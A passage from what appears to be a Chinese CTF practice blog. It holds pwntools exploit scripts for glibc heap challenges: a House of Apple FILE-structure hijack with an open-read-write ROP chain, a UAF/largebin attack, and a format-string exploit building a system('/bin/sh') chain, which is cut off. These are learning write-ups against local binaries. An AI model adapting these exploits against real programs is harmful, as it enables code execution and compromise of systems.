class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/python3<br><br>from pwn import *<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br>io=process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>io.sendlineafter(b<span class="hljs-string">&#x27;Please input your token: &#x27;</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">39</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">39</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>leaked_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>print(<span class="hljs-string">&quot;leaked_addr&quot;</span>,hex(leaked_addr))<br>libc_addr=leaked_addr - <span class="hljs-number">126</span> - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>print(<span class="hljs-string">&quot;libc_addr&quot;</span>,hex(libc_addr))<br><span class="hljs-meta"># gdb.attach(io)</span><br><br>#在<span class="hljs-built_in">stdin</span>的_IO_buf_base地址写\x00<br>target=libc_addr + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="hljs-number">0x38</span><br>print(<span class="hljs-string">&quot;target&quot;</span>,hex(target))<br>io.sendlineafter(b<span class="hljs-string">&#x27;Choice: &#x27;</span>, b<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-meta"># </span><br><span class="hljs-meta">io.sendlineafter(b<span class="hljs-string">&#x27;Size: &#x27;</span>, str(target + 1).encode())</span><br>io.sendlineafter(b<span class="hljs-string">&#x27;Content: &#x27;</span>, b<span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-built_in">stdout</span>=libc_addr + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><br>io.send(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-built_in">stdout</span>)+p64(<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0x300</span>))<br><br>IO_wfile_jumps=libc_addr + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>gadget=<span class="hljs-number">0x0000000000176f3e</span>+libc_addr<br>setcontext=libc_addr + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>openat=libc_addr + libc.sym[<span class="hljs-string">&#x27;openat&#x27;</span>]<br>read_addr=libc_addr + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libc_addr + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>rdi = libc_addr + <span class="hljs-number">0x000000000010f78b</span><br>rsi = libc_addr + <span class="hljs-number">0x0000000000110a7d</span><br>rdx = libc_addr + <span class="hljs-number">0x00000000000ab8a1</span><br>rcx = libc_addr + <span class="hljs-number">0x00000000000a877e</span><br><br>flag_addr = libc_addr + <span class="hljs-number">0x2034a0</span><br><br>gdb.attach(io)<br>payload = flat(&#123;<span class="hljs-number">0x0</span>:(~(<span class="hljs-number">2</span> | <span class="hljs-number">0x8</span> | <span class="hljs-number">0x800</span>)),<br>                <span class="hljs-number">0x28</span>:<span class="hljs-number">1</span>,<br>                <span class="hljs-number">0x38</span>:<span class="hljs-number">0</span>,<br>                <span class="hljs-number">0x88</span>:libc_addr+<span class="hljs-number">0x203000</span>,      # <span class="hljs-string">&#x27;_lock&#x27;</span><br>                <span class="hljs-number">0xa0</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0xf0</span>,             # <span class="hljs-string">&#x27;_wide_data&#x27;</span><br>                <span class="hljs-number">0xc0</span>:<span class="hljs-number">0</span>,                       # <span class="hljs-string">&#x27;_mode&#x27;</span><br>                <span class="hljs-number">0xd8</span>:IO_wfile_jumps,          # <span class="hljs-string">&#x27;vtable&#x27;</span><br>                <span class="hljs-number">0xe8</span>:<span class="hljs-built_in">stdout</span><br>               &#125;, filler=b<span class="hljs-string">&quot;\x00&quot;</span>)#触发house of apple<br><br>payload += flat(&#123;<span class="hljs-number">0x0</span>:b<span class="hljs-string">&quot;/flag\x00\x00\x00&quot;</span>,<br>                 <span class="hljs-number">0x8</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0xf0</span>+<span class="hljs-number">0x20</span>,   #使用gadget的时候控制可以call setcontext+<span class="hljs-number">61</span><br>                 <span class="hljs-number">0x18</span>:<span class="hljs-number">0</span>,<br>                 <span class="hljs-number">0x30</span>:<span class="hljs-number">0</span>,<br>                 <span class="hljs-number">0x38</span>:gadget,<br>                 <span class="hljs-number">0x40</span>:setcontext+<span class="hljs-number">61</span>,<br>                 <span class="hljs-number">0xe0</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0x128</span><span class="hljs-number">-0x68</span>,   # 这里应该是wide_data-&gt;vtable，调用偏移为<span class="hljs-number">0x68</span><br>                 <span class="hljs-number">0xc0</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0x1d8</span>,        <span class="hljs-meta"># rsp</span><br>                 <span class="hljs-number">0xc8</span>:openat,              <span class="hljs-meta"># rip</span><br>                 <span class="hljs-number">0x88</span>:<span class="hljs-number">-100</span>,                <span class="hljs-meta"># rdi</span><br>                 <span class="hljs-number">0x90</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0xf0</span>,         <span class="hljs-meta"># rsi</span><br>                 <span class="hljs-number">0xa8</span>:<span class="hljs-number">4</span>                    <span class="hljs-meta"># rdx</span><br>                &#125;, filler=b<span class="hljs-string">&quot;\x00&quot;</span>)<br><br>payload += flat([rdi, <span class="hljs-number">3</span>, rsi, flag_addr, rcx, flag_addr<span class="hljs-number">-0x10</span>, rdx, <span class="hljs-number">0x50</span>,<br>                 read_addr, rdi, <span class="hljs-number">1</span>, write_addr])<br><br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>（本来刷题记录不想写这么多的，但是奈何我当时真的没看懂那一份wp，我好菜QwQ）</p><p>好像进入到puts的调用链里面只需要控制f-&gt;_wide_data-&gt;_IO_write_end &#x3D;0，f-&gt;_wide_data-&gt;_IO_write_ptr&#x3D;0，fp-&gt;_wide_data-&gt;_IO_buf_base&#x3D;0就可以了，还有flag字段(~(2 | 0x8 | 0x800))就基本全绕过了（应该？）</p><p>这几天就这样吧，明天在做吧，打算做一道house of apple的</p><h2 id="2025-11-21-25——pwn-oneday"><a href="#2025-11-21-25——pwn-oneday" class="headerlink" title="2025.11.21-25——pwn_oneday"></a>2025.11.21-25——pwn_oneday</h2><p>今天做的事roderick师傅在介绍自己发现的house of apple的文章里面放的例题，之前本来打算写的，写了一半有事就给忘记了，今天打算重新做一下这道题</p><p>题目介绍：存在uaf漏洞，只能分配largebin，有三种大小key，key+16,2*key,使用的calloc分配，只能分配16个chunk，存在一次输出和一次写入</p><p>有一个问题，就是因为只有一次写，所以我们得布置一下堆空间，让wide_data写入的地址能够让我们在进行largebin attack的时候恰好也布置了。</p><p>这个堆风水，好难搞，为什么这个堆风水这么难配QAQ</p><p>经过我这几天坚持不懈的调试，终于，终于自己做出来了，太不容易了，我以为我应该是理解了house of apple这个利用手法的，但是当我做这道题目的时候，几乎是写一点卡一下，只能一点一点调试，然后修改我的伪造的结构的布局。踩的坑太多了，简直都不知道该怎么记录，所幸最后还是做出来了，当看到我自己写的flag出现在终端的时候，简直就是感动，太不容易了，实在还是太不容易了。</p><p>记录一下踩坑（可能太多了，有些我都不记得了）</p><p>1.当时配那个堆风水的时候，最开始我没有采纳roderick师傅写在例题处的那种方式，而是尝试自己去配。我当时采用的方案是先free一个2的chunk到largebin，然后通过之前放到这个chunk的0x30处的指针构造一个fake chunk1进行释放（通过唯一一次写修改那个chunk2），我甚至还在下面再构造一个0x80的chunk就是想绕过这个double free检测，但是我没想到还会继续往下查看我的prev_size对不对得上，导致一直没绕过（晕了）。最后还是采用roderick师傅得构造方式的时候才知道有多精妙，刚好可以溢出0x10,修改下一个chunk的size位。（所以chunk伪造还得是最少修改最好（确信））</p><p>2.然后就是构造结构体，太复杂了，因为我是纯手工自己配置，导致我写的地址总存在偏差，不得不一直动调进去计算，查看错误点，甚至因为太过混乱，我弄错了好几个字段，搞得我调了好久都不知道为什么会出问题。(这期间应该还有坑，但是我忘记了）（所以感觉house of apple有一个预制脚本真的是太爽了）</p><p>3.最后就是最后的rop部分了，我直接使用的bph的orw，结果，这些rdx竟然太大了，导致打开和读取失败，一段时间里面一直给我只读出来aaaaaaaaa，卡在最后一步一度让我很沮丧。但是因为知道rdx过大可能会造成函数调用失败，所以还是很快排查出来了。</p><p>接下来就是，终于写好了的wp！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs c">#! /bin/python3 <br>from pwn import*<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br>io=process(<span class="hljs-string">&#x27;./oneday&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oneday&#x27;</span>)<br><br>def choose(number):<br>    io.recvuntil(b<span class="hljs-string">&#x27;enter your command: \n&#x27;</span>)<br>    io.sendline(str(number).encode())<br>    <br>def add(choise):<br>    choose(<span class="hljs-number">1</span>)<br>    io.recvuntil(b<span class="hljs-string">&#x27;choise: &#x27;</span>)<br>    io.sendline(str(choise).encode())<br>    <br>def dele(index):<br>    choose(<span class="hljs-number">2</span>)<br>    io.recvuntil(b<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(str(index).encode())<br>    <br>def read(index,content):<br>    choose(<span class="hljs-number">3</span>)<br>    io.recvuntil(b<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(str(index).encode())<br>    io.recvuntil(b<span class="hljs-string">&#x27;Message: \n&#x27;</span>)<br>    io.send(content)<br><br>def write(index):<br>    choose(<span class="hljs-number">4</span>)<br>    io.recvuntil(b<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(str(index).encode())<br>    <br>io.sendlineafter(b<span class="hljs-string">&#x27;enter your key &gt;&gt;\n&#x27;</span>,b<span class="hljs-string">&#x27;10&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>)#<span class="hljs-number">0</span><br>add(<span class="hljs-number">2</span>)#<span class="hljs-number">1</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">2</span><br><br>dele(<span class="hljs-number">2</span>)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">3</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">4</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">5</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">6</span><br><br>dele(<span class="hljs-number">3</span>)<br>dele(<span class="hljs-number">5</span>)<br><br>write(<span class="hljs-number">3</span>)<br>io.recvline()<br>libc_addr=u64(io.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap=u64(io.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>offset_libc=<span class="hljs-number">0x7f70f84e8cc0</span><span class="hljs-number">-0x7f70f82f6000</span> <br>offset_heap=<span class="hljs-number">0x0000555c95af47f0</span><span class="hljs-number">-0x555c95af3000</span><br>libc_addr-=offset_libc<br>heap-=offset_heap<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;libc_addr:&#x27;</span>+hex(libc_addr))<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;heap:&#x27;</span>+hex(heap))<br><br>dele(<span class="hljs-number">4</span>)<br>dele(<span class="hljs-number">6</span>)<br><br>add(<span class="hljs-number">3</span>)#<span class="hljs-number">7</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">8</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">9</span><br><br>dele(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">3</span>)#<span class="hljs-number">10</span><br><br>offset=<span class="hljs-number">0x00007f299fd31260</span><span class="hljs-number">-0x7f299fb3e000</span><br><span class="hljs-built_in">stdout</span>=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>io_file_list=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;io_file_list:&#x27;</span>+hex(io_file_list))<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;stdout:&#x27;</span>+hex(<span class="hljs-built_in">stdout</span>))<br>heap1=heap+<span class="hljs-number">0x561ed1799810</span> - <span class="hljs-number">0x561ed1798000</span> <br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;heap1:&#x27;</span>+hex(heap1))<br>io_wfile_jump=libc_addr+libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>magic=libc_addr+<span class="hljs-number">0x00000000000fbe9e</span> <span class="hljs-meta">#mov rdx, qword ptr [rax + 0xb0] ; call qword ptr [rax + 0x88]</span><br>gadget=libc_addr+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;gadget:&#x27;</span>+hex(gadget))<br>openat=libc_addr + libc.sym[<span class="hljs-string">&#x27;openat&#x27;</span>]<br>read_addr=libc_addr + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libc_addr + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi=libc_addr+<span class="hljs-number">0x000000000002daa2</span><br>rsi=libc_addr+<span class="hljs-number">0x0000000000037c0a</span><br>rdx_r12=libc_addr+<span class="hljs-number">0x00000000001066e1</span><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(io_file_list<span class="hljs-number">-0x20</span>)<br>payload+=flat(&#123;<span class="hljs-number">0x0</span>:(~(<span class="hljs-number">2</span> | <span class="hljs-number">0x8</span> | <span class="hljs-number">0x800</span>)),<br>               <span class="hljs-number">0x8</span>:<span class="hljs-number">0xa81</span>,<br>               <span class="hljs-number">0x28</span>:<span class="hljs-number">1</span>, #这个值会被覆盖掉<br>               <span class="hljs-number">0x38</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0x88</span>:heap1+<span class="hljs-number">0x500</span>,<span class="hljs-meta">#lock</span><br>               <span class="hljs-number">0xa0</span>:heap1+<span class="hljs-number">0xf0</span>,#wide_data<br>               <span class="hljs-number">0xc0</span>:<span class="hljs-number">0</span>,<span class="hljs-meta">#mode</span><br>               <span class="hljs-number">0xd8</span>:io_wfile_jump,<span class="hljs-meta">#vtable</span><br>               <span class="hljs-number">0xe0</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0xe8</span>:<span class="hljs-number">0</span>#最后两个<span class="hljs-number">0</span>写错了，只是偏移之前已经计算好了，再改比较麻烦，就留下了<br>&#125;)<br>payload+=flat(&#123;<span class="hljs-number">0x0</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0x18</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0x30</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0x68</span>:magic,<br>               <span class="hljs-number">0x88</span>:gadget+<span class="hljs-number">61</span>,<br>               <span class="hljs-number">0xb0</span>:heap1+<span class="hljs-number">0x1f0</span>,<br>               <span class="hljs-number">0xe0</span>:heap1+<span class="hljs-number">0xf0</span>,<br>               <span class="hljs-number">0xe8</span>:<span class="hljs-number">0</span><br>               &#125;)<br>payload+=p64(<span class="hljs-number">0</span>)+b<span class="hljs-string">&#x27;/flag\x00\x00\x00&#x27;</span><br>payload+=flat(&#123;<span class="hljs-number">0xa0</span>:heap1+<span class="hljs-number">0x2f0</span>,<span class="hljs-meta">#rsp</span><br>               <span class="hljs-number">0xa8</span>:openat,<span class="hljs-meta">#rcx</span><br>               <span class="hljs-number">0x68</span>:<span class="hljs-number">-100</span>,<span class="hljs-meta">#rdi</span><br>               <span class="hljs-number">0x70</span>:heap1+<span class="hljs-number">0x1e8</span>,<span class="hljs-meta">#rsi</span><br>               <span class="hljs-number">0x88</span>:<span class="hljs-number">0</span><span class="hljs-meta">#rdx</span><br>               &#125;)<br>payload+=b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x50</span><br>payload+=p64(rdi)+p64(<span class="hljs-number">0x3</span>)+p64(rsi)+p64(heap1+<span class="hljs-number">0x400</span>)+p64(rdx_r12)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x0</span>)+p64(read_addr)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x1</span>)+p64(rsi)+p64(heap1+<span class="hljs-number">0x400</span>)+p64(rdx_r12)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x0</span>)+p64(write_addr)<br>payload1=payload.ljust(<span class="hljs-number">0xa98</span>,b<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload1+=p64(<span class="hljs-number">0xab1</span>)<br><br><br>read(<span class="hljs-number">5</span>, payload1)<br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">3</span>)<br><span class="hljs-meta"># gdb.attach(io)</span><br>io.sendlineafter(b<span class="hljs-string">&#x27;enter your command: \n&#x27;</span>,b<span class="hljs-string">&#x27;9&#x27;</span>)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><p>为什么感觉我的脚本写得还是那么丑陋呢（思索）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251125231657-0sa7309.png" alt="image"></p><p>很久没有做一道题坚持这么久了，当看到flag的时候都开始感动了。</p><p>明天的刷题预告是，阴间ctf的CMWL，之前没做出来，但是我现在感觉我应该能做了，而且考点是house of 魑魅魍魉，当时都不知道这个手法。</p><h2 id="2025-11-22——cursed-format"><a href="#2025-11-22——cursed-format" class="headerlink" title="2025.11.22——cursed_format"></a>2025.11.22——cursed_format</h2><p>一个国外比赛的的题目，没什么新意，就纯考格式化字符串，只是因为之前不太喜欢格式化字符串所以一直不怎么会，用这道题练了练</p><p>我只打了本地</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import*<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br>io=process(<span class="hljs-string">&#x27;./cursed_format&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./cursed_format&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <br><br>def xor(a: bytes, b: bytes) -&gt; bytes<br>    res = bytearray(len(a))<br>    <span class="hljs-keyword">for</span> i in range(len(a)):<br>        res[i] = a[i] ^ b[i % len(b)]<br>    <span class="hljs-keyword">return</span> bytes(res)<br><br><br>def strings(strings,key):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendline(xor(strings,key))<br>    <br>def leave():<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;2&#x27;</span>)<br>    <br>offset=<span class="hljs-number">12</span><br>offset1=<span class="hljs-number">0x29d90</span><br>strings((b<span class="hljs-string">&#x27;aaa%1$p.%19$p&#x27;</span>).ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>),b<span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">32</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;aaa&#x27;</span>)<br><span class="hljs-built_in">stack</span>=<span class="hljs-type">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;.&#x27;</span>)<br>libc_addr=<span class="hljs-type">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>libc_addr-=offset1<br>print(<span class="hljs-string">&#x27;libc:&#x27;</span>,hex(libc_addr))<br>print(<span class="hljs-string">&#x27;stack:&#x27;</span>,hex(<span class="hljs-built_in">stack</span>))<br><br>pop_rdi=<span class="hljs-number">0x000000000002a3e5</span>+libc_addr<br>sys=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_addr<br>binsh=next(libc.search(b<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))+libc_addr<br><br>pop_rdi_low=pop_rdi&amp;<span class="hljs-number">0xff</span><br>pop_rdi_mid=(pop_rdi&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>pop_rdi_high=(pop_rdi&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br><br><br>payload1=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(pop_rdi_low).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x38</span>)<br>key1=(b<span class="hljs-string">&#x27;aaa%1$p.%19$p&#x27;</span>).ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>)<br>strings(payload1,key1)<br>payload2=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(pop_rdi_mid).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x39</span>)<br>strings(payload2,payload1.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload3=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(pop_rdi_high).encode()).ljust(<span class="hljs-number">0x10</span>,b<span 